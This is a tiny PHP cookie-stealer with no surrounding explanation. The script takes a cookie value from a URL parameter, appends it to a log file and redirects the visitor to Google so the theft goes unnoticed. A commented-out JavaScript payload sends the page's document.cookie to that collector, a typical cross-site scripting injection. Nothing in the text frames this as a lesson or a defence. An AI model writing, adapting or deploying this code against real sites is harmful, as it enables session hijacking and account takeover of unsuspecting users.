<?php
header ('Location:https://google.com');
$cookies = $_GET["c"];
$file = fopen('log.txt', 'a');
fwrite($file, $cookies . "\n\n");
 ?>

 <!-- <script type="text/javascript">
 document.location='http://localhost/cookieStealer/index.php?c='+document.cookie;
 </script> -->
